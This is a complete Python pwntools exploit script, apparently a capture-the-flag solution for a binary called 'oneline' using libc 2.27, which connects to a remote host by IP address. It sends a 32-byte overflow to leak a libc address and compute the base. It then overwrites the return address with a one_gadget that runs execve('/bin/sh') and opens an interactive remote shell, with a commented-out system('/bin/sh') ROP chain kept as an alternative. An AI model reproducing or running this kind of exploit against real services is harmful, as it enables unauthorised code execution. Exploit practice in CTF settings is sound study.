from pwn import *
from pwn_debug.pwn_debug import *
context.log_level = 'debug'

TARGET = "oneline"
LIBC = "./libc-2.27.so"
elf = ELF(TARGET)
libc = ELF(LIBC) 

HOST = '153.120.129.186'
PORT = 10000

pdbg = pwn_debug(TARGET)
pdbg.local(LIBC) 
# r = pdbg.run("local")
r = remote(HOST, PORT)

# bp, fork-mode, command
# pdbg.bp([], 'child', ['x/20gx $rax', 'vmmap'])

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r.recvuntil('>> ')

payload = ''
payload += 'A' * 32

r.send(payload) 
leak = u64(r.recvuntil('Once')[-12:-4])
base = leak - 0x110140
dbg("leak")
dbg("base")

rdi = base + 0x1102e5
system = base + 0x4f440
binsh = base + 0x1b3e9a
gadget = [
0x4f2c5, # execve("/bin/sh", rsp+0x40, environ)
0x4f322, # execve("/bin/sh", rsp+0x40, environ)
0x10a38c # execve("/bin/sh", rsp+0x70, environ)
]
r.recvuntil('>> ')

payload = ''
payload += 'A' * 32
payload += p64(base + gadget[1])
'''
payload += p64(rdi)
payload += p64(binsh) 
# payload += p64(rdi+1)
payload += p64(system)
'''
r.sendline(payload) 

r.interactive()
